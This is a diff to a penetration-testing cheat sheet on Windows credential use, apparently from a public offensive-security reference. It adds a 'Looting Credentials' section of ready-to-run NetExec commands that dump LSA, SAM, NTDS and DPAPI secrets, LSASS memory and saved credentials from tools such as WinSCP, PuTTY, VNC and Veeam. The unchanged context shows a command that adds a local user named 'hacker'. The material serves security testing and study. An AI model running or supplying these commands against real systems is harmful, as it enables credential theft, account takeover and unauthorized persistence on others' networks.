@@ -2,17 +2,17 @@
 
 ## Summary
 
-* [Get credentials](#get-credentials)
-    * [Create your credential](#create-your-credential)
+* [Get Credentials](#get-credentials)
+    * [Create Credential](#create-credential)
+    * [Looting Credentials](#looting-credentials)
     * [Guest Credential](#guest-credential)
     * [Retail Credential](#retail-credential)
     * [Sandbox Credential](#sandbox-credential)
-* [netexec](#netexec)
+* [NetExec](#netexec)
 * [Impacket](#impacket)
     * [PSExec](#psexec)
     * [WMIExec](#wmiexec)
     * [SMBExec](#smbexec)
-
 * [RDP Remote Desktop Protocol](#rdp-remote-desktop-protocol)
 * [Powershell Remoting Protocol](#powershell-remoting-protocol)
     * [Powershell Credentials](#powershell-credentials)
@@ -27,9 +27,9 @@
     * [Mount a remote share](#mount-a-remote-share)
     * [Run as another user](#run-as-another-user)
 
-## Get credentials
+## Get Credentials
 
-### Create your credential
+### Create Credential
 
 ```powershell
 net user hacker Hcker_12345678* /add /Y
@@ -59,6 +59,26 @@ Some info about your user
 ```powershell
 net user /dom
 net user /domain
+```
+
+### Looting Credentials
+
+```ps1
+nxc smb 10.10.10.10 -u username -p password -d domain --lsa
+nxc smb 10.10.10.10 -u username -p password -d domain --sam
+nxc smb 10.10.10.10 -u username -p password -d domain --dpapi nosystem
+nxc smb 10.10.10.10 -u username -p password -d domain --dpapi cookies
+nxc smb 10.10.10.10 -u username -p password -d domain --dpapi
+nxc smb 10.10.10.10 -u username -p password -d domain --sccm
+nxc smb 10.10.10.10 -u username -p password -d domain --ntds
+nxc smb 10.10.10.10 -u username -p password -d domain -M lsassy
+nxc smb 10.10.10.10 -u username -p password -d domain -M nanodump
+nxc smb 10.10.10.10 -u username -p password -d domain -M veeam
+nxc smb 10.10.10.10 -u username -p password -d domain -M winscp
+nxc smb 10.10.10.10 -u username -p password -d domain -M putty
+nxc smb 10.10.10.10 -u username -p password -d domain -M vnc
+nxc smb 10.10.10.10 -u username -p password -d domain -M mremoteng
+nxc smb 10.10.10.10 -u username -p password -d domain -M rdcman
 ```
 
 ### Guest Credential
